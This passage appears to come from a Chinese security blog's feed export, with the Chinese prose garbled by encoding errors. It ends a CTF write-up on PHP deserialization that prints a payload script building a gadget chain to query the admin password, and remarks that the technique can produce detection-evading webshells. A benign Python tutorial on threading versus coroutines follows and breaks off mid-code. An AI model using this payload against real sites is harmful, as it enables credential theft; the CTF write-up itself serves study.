<p>å¦‚æœæŠŠinfoç±»å®ä¾‹åŒ–çš„å¯¹è±¡çš„CtrlCaseå€¼èµ‹å€¼ä¸ºdbCtrlç±»å®ä¾‹åŒ–çš„å¯¹è±¡å°±å¯ä»¥ç›´æ¥è°ƒç”¨loginæ‰§è¡ŒæŸ¥è¯¢å‡½æ•°ï¼Œæ³¨æ„ __call å‡½æ•° ä¸€èˆ¬å°±æ˜¯ä¸¤ä¸ªå‚æ•° ç¬¬ä¸€ä¸ªå‚æ•°$nameæ˜¯è°ƒç”¨çš„ä¸å­˜åœ¨çš„å‡½æ•°åï¼Œç¬¬äºŒä¸ªå‚æ•°$argumentæ˜¯ä¸å­˜åœ¨å‡½æ•°è°ƒç”¨æ—¶ä¼ é€’çš„å‚æ•°ç»„ è¿™é‡Œçš„argument[0]å°±æ˜¯$this-&gt;ageã€‚æ‰€ä»¥æŠŠ$this-&gt;ageèµ‹å€¼ä¸ºsqlæŸ¥è¯¢è¯­å¥å³å¯æŸ¥è¯¢å‡ºadminçš„å¯†ç å¹¶æ‰“å°å‡ºæ¥ã€‚</p>
<p>æœ€ç»ˆpayloadï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">Class UpdateHelper&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newinfo</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span>=<span class="string">&quot;gz110351&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span>=<span class="string">&quot;user&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test_UpdateHelper</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>();</span><br><span class="line"><span class="variable">$test_user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test_info</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$test_dbCtrl</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$test_info</span>-&gt;CtrlCase=<span class="variable">$test_dbCtrl</span>;</span><br><span class="line"><span class="variable">$test_user</span>-&gt;nickname=<span class="variable">$test_info</span>;</span><br><span class="line"><span class="variable">$test_user</span>-&gt;age = <span class="string">&quot;select password,id from user where username=?&quot;</span>;</span><br><span class="line"><span class="variable">$test_UpdateHelper</span>-&gt;sql = <span class="variable">$test_user</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test_UpdateHelper</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–åçš„ç»“æœï¼Œè¦åŠ ä¸Š â€œ;s:8:â€CtrlCaseâ€;+payload+} å› ä¸ºæˆ‘ä»¬åªèƒ½æ§åˆ¶éƒ¨åˆ†ï¼Œè€Œä»£ç åœ¨åºåˆ—åŒ–æ—¶å°±ä¼šæ ‡æ˜æœ‰ä¸‰ä¸ªå±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿè¦ä¿æŒä¸‰ä¸ªå±æ€§ï¼Œå¦åˆ™ä¸èƒ½ååºåˆ—åŒ–æˆåŠŸã€‚å¦å¤–ååºåˆ—åŒ–ä»¥å­—èŠ‚æ•°ç”Ÿå‘½å’Œ ; } ä½œä¸ºç»ˆæ­¢ç¬¦ï¼Œæ‰€ä»¥æœ€ååŠ  } æ¥è¿‡æ»¤æ‰åç»­ç”Ÿæˆçš„ s:8:â€CtrlCaseâ€; æœ€åæ ¹æ®è¿™ä¸ªpayloadçš„å­—ç¬¦æ•°ï¼Œæˆ‘ä»¬éœ€è¦åœ¨nicknameä¸­æ’å…¥è¶³é‡çš„é»‘åå•å­—ç¬¦ï¼ŒæŠŠpayloadæŒ¤å‡ºæ¥ï¼Œä½¿å¾—å®ƒå¯ä»¥è¢«æ­£å¸¸å‘åºåˆ—åŒ–è§¦å‘ã€‚</p>
<h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>phpçš„ååºåˆ—åŒ–æœ€é‡è¦çš„è¿˜æ˜¯åˆ©ç”¨é“¾çš„æ„é€ ï¼Œå½“ç„¶è¿™ä¹Ÿæ˜¯æœ€éš¾çš„éƒ¨åˆ†ã€‚<br>å¦å¤–phpååºåˆ—åŒ–å¯ä»¥å†™å„ç§è¿‡ç‹—é©¬ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å»ç©å„¿ç©å„¿ã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonå¼€å‘ä¸­çš„é€Ÿåº¦è¿½æ±‚</title>
    <url>//posts/python%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E9%80%9F%E5%BA%A6%E8%BF%BD%E6%B1%82/</url>
    <content><![CDATA[<h1 id="pythonä¸­æ‰§è¡Œé€Ÿåº¦çš„æŠ€æœ¯é€‰æ‹©"><a href="#pythonä¸­æ‰§è¡Œé€Ÿåº¦çš„æŠ€æœ¯é€‰æ‹©" class="headerlink" title="pythonä¸­æ‰§è¡Œé€Ÿåº¦çš„æŠ€æœ¯é€‰æ‹©"></a>pythonä¸­æ‰§è¡Œé€Ÿåº¦çš„æŠ€æœ¯é€‰æ‹©</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘åœ¨å¼€å‘ä¸€ä¸ªæ‰«æçš„é¡¹ç›®ï¼Œå¾ˆå¤šæ—¶å€™ï¼Œå‘ç°ä¸€ä¸ªå‡½æ•°çš„æ‰§è¡Œæ¯”è¾ƒé¢‘ç¹ä¸”ç¼“æ…¢ï¼Œæˆ‘ä¸çŸ¥é“åº”è¯¥ç”¨å¤šçº¿ç¨‹ã€åç¨‹ã€è¿˜æ˜¯å¤šè¿›ç¨‹ æˆ–æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ç­‰ã€‚</p>
<p>è¿™è¯´æ˜ç›®å‰å¼€å‘æ°´å¹³å¤ªå·®ï¼Œè¿˜æ˜¯æœ‰å¾ˆå¤šéœ€è¦å­¦ä¹ çš„åœ°æ–¹ã€‚æ‰€ä»¥å°±æƒ³ç€å­¦ä¹ ä¸€äº›å„ä¸ªæŠ€æœ¯ï¼Œç„¶åç®€å•çš„åšä¸ªç¬”è®°å•Šï¼Œå¹¶æ€»ç»“å‡ºä»€ä¹ˆæ—¶å€™ç”¨å“ªç§æŠ€æœ¯ï¼Œå¯ä»¥è®©æ•´ä¸ªæ‰«ææ›´å¿«ã€‚å½“ç„¶ç›®å‰è¿˜æ˜¯è‡ªå—¨å¼€å‘å°é¡¹ç›®é˜¶æ®µï¼Œæ²¡åšè¿‡å¤§é¡¹ç›®å·¥ç¨‹ï¼Œæœ‰è§è§£ä¸å¯¹çš„åœ°æ–¹è¿˜æœ›çœ‹åˆ°çš„äººæŒ‡æ­£ã€‚</p>
<p>åé¢ä¸»è¦ä»‹ç»å¤šçº¿ç¨‹ã€åç¨‹ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå¼‚æ­¥ã€‚</p>
<h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><p>pythonä¸€æèµ·å¤šçº¿ç¨‹ï¼Œæˆ‘ä»¬æœåˆ°çš„èµ„æ–™åŸºæœ¬å°±ä¼šè¯´æ˜¯é¸¡è‚‹ï¼Œæ˜¯æ²¡ç”¨çš„ï¼Œåº”è¯¥ä½¿ç”¨åç¨‹ã€‚ä»¥å‰æˆ‘ä¹Ÿæ²¡æœ‰å¥½å¥½çš„æ·±ç©¶è¿‡è¿™ä¸ªé—®é¢˜ï¼Œç°åœ¨æˆ‘ä»¬æ¥çœ‹ä¸‹pythonçš„å¤šçº¿ç¨‹åˆ°åº•æœ‰æ²¡æœ‰ç”¨ï¼Ÿ</p>
<p>é¦–å…ˆç½‘ä¸Šçš„èµ„æ–™éƒ½ä¼šè¯´åˆ°GILçš„é—®é¢˜å¯¼è‡´pythonå¤šçº¿ç¨‹å¾ˆé¸¡è‚‹ï¼Œé‚£ä»€ä¹ˆæ˜¯GILé”ï¼Ÿ</p>
<p><strong>GILé”</strong></p>
<p>GILçš„å­˜åœ¨ä¸»è¦æ˜¯ä¸ºäº†é˜²æ­¢Pythonè§£é‡Šå™¨ä¸­çš„æ•°æ®ç»“æ„è¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹ï¼Œå¯¼è‡´æ•°æ®ç»“æ„å‡ºç°ä¸ä¸€è‡´çš„æƒ…å†µã€‚é€šè¿‡é™åˆ¶åŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½å¤Ÿæ‰§è¡ŒPythonå­—èŠ‚ç ï¼ŒGILå¯ä»¥ç¡®ä¿Pythonè§£é‡Šå™¨ä¸­çš„æ•°æ®ç»“æ„ä¸ä¼šè¢«å¤šä¸ªçº¿ç¨‹åŒæ—¶ä¿®æ”¹ï¼Œä»è€Œä¿è¯çº¿ç¨‹å®‰å…¨ã€‚</p>
<p><strong>æµ‹è¯•</strong></p>
<p>æˆ‘ä»¬å†™ä¸€ä¸ªå¤šçº¿ç¨‹å’Œæ™®é€šæ‰§è¡Œçš„æµ‹è¯•ï¼Œéƒ½æ‰§è¡Œ5000æ¬¡è®¡ç®—ï¼Œä¸€ä¸ªå•çº¿ç¨‹æ‰§è¡Œï¼Œä¸€ä¸ªå¤šçº¿ç¨‹æ‰§è¡Œï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ‰“å°éšæœºæ•°çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_random</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">        result = <span class="number">9999999919</span>+<span class="number">5678987656</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºçº¿ç¨‹å¹¶å¯åŠ¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_threads</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ppdom</span>():</span><br><span class="line">        result = <span class="number">9999999919</span>+<span class="number">5678987656</span></span><br><span class="line">        <span class="comment"># response = requests.get(&quot;https://www.baidu.com&quot;)</span></span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):  <span class="comment"># åˆ›å»º500ä¸ªçº¿ç¨‹</span></span><br><span class="line">        thread = threading.Thread(target=ppdom)</span><br><span class="line">        thread.start()</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¤šçº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_singal</span>():</span><br><span class="line">    start_time_signal = time.time()</span><br><span class="line">    print_random()</span><br><span class="line">    end_time_signal = time.time()</span><br><span class="line">    <span class="built_in">print</span>(start_time_signal)</span><br><span class="line">    <span class="built_in">print</span>(end_time_signal)</span><br><span class="line">    execution_time1 = end_time_signal - start_time_signal</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å•çº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time1)</span><br><span class="line"><span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    create_singal()</span><br><span class="line">    create_threads()</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œå¤šæ¬¡å‘ç°ï¼Œå¤šçº¿ç¨‹æ¯”å•çº¿ç¨‹çš„è€—æ—¶æ›´é•¿(æ³¨æ„è¿™é‡Œå•çº¿ç¨‹æ˜¯e-05æ¬¡æ–¹)ï¼š</p>
<p>![image-20230904140830892](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230904140830892.png)</p>
<p>è¿™çœŸçš„å¾ˆç¦»è°±ï¼Œå¤šçº¿ç¨‹å¥½åƒè¿˜ä¸å¦‚å•çº¿ç¨‹å‘¢ï¼Œå®Œå…¨æ²¡å¿…è¦ç”¨åˆ°å¤šçº¿ç¨‹ã€‚éš¾é“çœŸçš„å°±æ˜¯ç½‘ä¸Šè¯´çš„å•¥æ—¶å€™éƒ½åˆ«ç”¨å¤šçº¿ç¨‹å°±å¯¹äº†å—ï¼Ÿ</p>
<p>é‚£å†çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## å¤šçº¿ç¨‹å’Œå•çº¿ç¨‹çš„æ¯”è¾ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°éšæœºæ•°çš„å‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_random</span>():</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="comment"># result = 99+100</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºçº¿ç¨‹å¹¶å¯åŠ¨</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_threads</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ppdom</span>():</span><br><span class="line">        <span class="comment"># result = 99+100</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):  <span class="comment"># åˆ›å»º5ä¸ªçº¿ç¨‹</span></span><br><span class="line">        thread = threading.Thread(target=ppdom)</span><br><span class="line">        thread.start()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¤šçº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_singal</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    print_random()</span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å•çº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"><span class="comment"># è°ƒç”¨å‡½æ•°</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    create_threads()</span><br><span class="line">    create_singal()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬ä»…ä¿®æ”¹å‡½æ•°ä»åŸæ¥çš„ç®€å•è®¡ç®—æ”¹ä¸ºç½‘ç»œè¯·æ±‚ï¼Œè¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p>
<p>![image-20230901172004526](&#x2F;Users&#x2F;geez&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20230901172004526.png)</p>
<p>åŒæ ·æ‰§è¡Œäº”æ¬¡è¯·æ±‚ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å‘ç°å¤šçº¿ç¨‹è¿œè¿œå¿«äºå•çº¿ç¨‹ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p>
<p>å› ä¸ºè€—æ—¶çš„IOåº”ç”¨ï¼ˆå†…å­˜ã€ç½‘ç»œã€ç¡¬ç›˜ç­‰ç­‰è¯»å–å±äºIOå¯†é›†å‹è¿ç®—ï¼‰å¹¶ä¸å½±å“çº¿ç¨‹çš„æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯cpuå’ŒIOæ˜¯å¯ä»¥å¹¶è¡Œçš„ã€‚ç”±äºä¸Šé¢çš„ä»£ç ä¸­ request.get() ä¸€ä¸ª I&#x2F;O å¯†é›†å‹æ“ä½œï¼Œå³ä¸»è¦èŠ±è´¹æ—¶é—´åœ¨ç­‰å¾…ç½‘ç»œ I&#x2F;O æ“ä½œå®Œæˆä¸Šã€‚ç”±äºçº¿ç¨‹æ˜¯ç‹¬ç«‹çš„ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…ç½‘ç»œå“åº”æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä»è€Œæœ€å¤§ç¨‹åº¦ä¸Šå‡å°‘äº†é˜»å¡ç­‰å¾…çš„æ—¶é—´ã€‚æ‰€ä»¥æˆ‘ä»¬ä¹Ÿèƒ½çœ‹åˆ°é€Ÿåº¦é£å¿«ã€‚</p>
<p><strong>ç»“è®º</strong></p>
<p>ç”±æ­¤æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼Œåœ¨GILé”å­˜åœ¨çš„æƒ…å†µä¸‹ï¼Œå¦‚æœç¨‹åºæ˜¯IOå¯†é›†å‹çš„ï¼Œé‚£ä¹ˆå¤šçº¿ç¨‹å¯ä»¥æå¤§çš„åŠ å¿«é€Ÿåº¦ã€‚ä½†å¦‚æœç¨‹åºä¸æ˜¯ I&#x2F;O å¯†é›†å‹æ—¶ï¼Œå¤šçº¿ç¨‹å¯èƒ½å¹¶ä¸èƒ½æé«˜æ€§èƒ½ï¼Œç”šè‡³è¿˜å¯èƒ½å› ä¸ºçº¿ç¨‹é—´çš„ä¸Šä¸‹æ–‡åˆ‡æ¢å¯¼è‡´é¢å¤–çš„å¼€é”€ã€‚å¦å¤–ç”±äºGILé”çš„å­˜åœ¨ï¼Œå³ä½¿ä½ çš„CPUå¤šæ ¸ï¼Œä¹Ÿå¾ˆéš¾å‘æŒ¥ä½œç”¨ã€‚æ‰€ä»¥å¤šçº¿ç¨‹çš„è¿ç”¨ä¸å¦ä¸»è¦è€ƒè™‘æ˜¯å¦æ˜¯IOå¯†é›†å‹çš„æ“ä½œã€‚</p>
<h2 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h2><p>ä¸Šé¢è¯´åˆ°äº†å¤šçº¿ç¨‹ï¼Œç°åœ¨å†æ¥çœ‹çœ‹åç¨‹æ˜¯æ€ä¹ˆå›äº‹ã€‚</p>
<p><strong>æ¦‚å¿µ</strong><br>Python 3 å¼•å…¥äº†åç¨‹ï¼ˆcoroutineï¼‰çš„æ¦‚å¿µï¼Œé€šè¿‡ä½¿ç”¨å…³é”®å­— async å’Œ await å®ç°ã€‚åç¨‹æ˜¯ä¸€ç§è½»é‡çº§çš„å¹¶å‘ç¼–ç¨‹æ–¹å¼ï¼Œæ”¯æŒåœ¨å•çº¿ç¨‹ä¸­å®ç°å¹¶å‘æ‰§è¡Œçš„æ•ˆæœã€‚</p>
<p>ä¸‹é¢æ˜¯Python 3ä¸­åç¨‹çš„ä¸€äº›é‡è¦ç‰¹ç‚¹å’Œæ¦‚å¿µï¼š</p>
<ul>
<li>åç¨‹ä¸ç”Ÿæˆå™¨ï¼ˆgeneratorï¼‰ï¼šåç¨‹ä½¿ç”¨async defå®šä¹‰ï¼Œå¹¶é€šè¿‡awaitå…³é”®å­—æ¥æŒ‚èµ·æ‰§è¡Œå’Œç­‰å¾…å…¶ä»–åç¨‹å®Œæˆã€‚åç¨‹æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ç‰¹æ®Šçš„ç”Ÿæˆå™¨ï¼Œåˆ©ç”¨ç”Ÿæˆå™¨çš„yieldå…³é”®å­—è¿›è¡ŒçŠ¶æ€ä¿å­˜å’Œæ¢å¤ã€‚</li>
<li>async å’Œ awaitå…³é”®å­—ï¼šasyncå…³é”®å­—ç”¨äºå®šä¹‰åç¨‹å‡½æ•°ï¼Œè¡¨ç¤ºå‡½æ•°æ˜¯ä¸€ä¸ªå¯ä»¥è¢«æŒ‚èµ·å’Œæ¢å¤çš„åç¨‹ã€‚awaitå…³é”®å­—ç”¨äºæŒ‚èµ·åç¨‹çš„æ‰§è¡Œï¼Œç­‰å¾…å¦ä¸€ä¸ªåç¨‹å®Œæˆæˆ–è€…ç­‰å¾…I&#x2F;Oæ“ä½œå®Œæˆã€‚</li>
<li>éé˜»å¡çš„ç­‰å¾…ï¼šåç¨‹å¯ä»¥åœ¨ç­‰å¾…I&#x2F;Oå®Œæˆæ—¶æŒ‚èµ·æ‰§è¡Œï¼Œå…è®¸å…¶ä»–åç¨‹ç»§ç»­æ‰§è¡Œã€‚è¿™ç§éé˜»å¡çš„ç­‰å¾…æ–¹å¼ä½¿å¾—åç¨‹èƒ½å¤Ÿå……åˆ†åˆ©ç”¨CPUå’ŒI&#x2F;Oèµ„æºï¼Œæé«˜å¹¶å‘æ€§èƒ½ã€‚</li>
<li>äº‹ä»¶å¾ªç¯ï¼ˆevent loopï¼‰ï¼šPython 3çš„åç¨‹é€šå¸¸ä¼šåœ¨äº‹ä»¶å¾ªç¯ä¸­æ‰§è¡Œã€‚äº‹ä»¶å¾ªç¯è´Ÿè´£è°ƒåº¦å¤šä¸ªåç¨‹ï¼Œä½¿å®ƒä»¬èƒ½å¤Ÿäº¤æ›¿æ‰§è¡Œå’Œç­‰å¾…ï¼Œä»¥å®ç°å¹¶å‘æ•ˆæœã€‚</li>
<li>å¼‚æ­¥I&#x2F;Oæ”¯æŒï¼šåç¨‹åœ¨å¤„ç†I&#x2F;Oå¯†é›†å‹ä»»åŠ¡æ—¶ç‰¹åˆ«æœ‰æ•ˆã€‚å¸¸ç”¨çš„å¼‚æ­¥I&#x2F;Oåº“ä¾‹å¦‚asyncioæä¾›äº†é«˜çº§çš„å¼‚æ­¥ç¼–ç¨‹æœºåˆ¶ï¼Œç”¨äºå¤„ç†åç¨‹ä¹‹é—´çš„è°ƒåº¦å’Œåä½œã€‚</li>
</ul>
<p><strong>æµ‹è¯•</strong><br>æˆ‘ä»¬å†æ¬¡ç¼–å†™ä¸€ä¸ªæµ‹è¯•å‡½æ•°ï¼Œåˆ†åˆ«ç”¨åˆ°äº†åç¨‹ã€å¤šçº¿ç¨‹å’Œå•çº¿ç¨‹ï¼Œåˆ†åˆ«æ‰§è¡Œ50æ¬¡çš„è¯·æ±‚ç™¾åº¦çš„è¿ç®—ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ™®é€šæ‰§è¡Œç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">normal_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        <span class="comment"># result = 99+1000</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;æ™®é€šæ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šçº¿ç¨‹æ‰§è¡Œç‰ˆæœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_execution</span>():</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    threads = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">thread_function</span>():</span><br><span class="line">        <span class="comment"># result = 99+1000</span></span><br><span class="line">        response = requests.get(<span class="string">&quot;https://www.baidu.com&quot;</span>)</span><br><span class="line">        <span class="comment"># print(response)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">        thread = threading.Thread(target=thread_function)</span><br><span class="line">        threads.append(thread)</span><br><span class="line">        thread.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    end_time = time.time()</span><br><span class="line">    execution_time = end_time - start_time</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¤šçº¿ç¨‹æ‰§è¡Œè€—æ—¶ï¼š&quot;</span>, execution_time)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">session</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://www.baidu.com&#x27;</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> response.text()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">request_baidu</span>():</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">            task = asyncio.ensure_future(fetch(session))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¯”è¾ƒå‡½æ•°</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compare_execution_time</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;å¼€å§‹æ™®é€šæ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    normal_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå¼€å§‹å¤šçº¿ç¨‹æ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    threaded_execution()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nå¼€å§‹åç¨‹æ‰§è¡Œ...&quot;</span>)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    loop = 